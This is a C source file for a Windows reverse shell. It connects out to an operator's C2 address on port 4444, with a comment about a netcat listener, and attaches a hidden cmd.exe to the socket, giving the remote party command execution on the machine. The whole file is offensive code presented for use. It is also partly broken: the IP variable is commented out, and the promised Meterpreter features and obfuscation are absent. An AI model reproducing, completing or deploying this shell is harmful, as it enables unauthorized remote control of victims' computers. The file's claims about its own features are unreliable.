//Basic Meterpreter Reverse Shell with Obfuscation
//Based off ActiveXSploit's "Coding a basic reverse shell" 
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h> // Include this for the exit() function

#pragma comment(lib, "Ws2_32.lib")

int main() {
    SOCKET shell;
    struct sockaddr_in shell_addr;
    WSADATA wsa;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char recvserver[512];

    // Add Kali/C2 ip
    //char ip_addr[] = "";
    //nc -nvlp [port#] on c2 machine
    int port = 4444;
    int connection;

    // Initialize winsocket
    WSAStartup(MAKEWORD(2, 2), &wsa);

    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    shell_addr.sin_port = htons(port);
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

    connection = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);

    if (connection == SOCKET_ERROR) {
        printf("Connection to target server failed!\n");
        exit(0); // Use exit() from the stdlib.h header
    } else {
        recv(shell, recvserver, sizeof(recvserver), 0);
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = (STARTF_USESTDHANDLES & ~STARTF_USESHOWWINDOW);
        si.wShowWindow = SW_HIDE;
        
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)shell;
        CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        memset(recvserver, 0, sizeof(recvserver));
    }

    WSACleanup(); // Cleanup Winsock

    return 0;
}
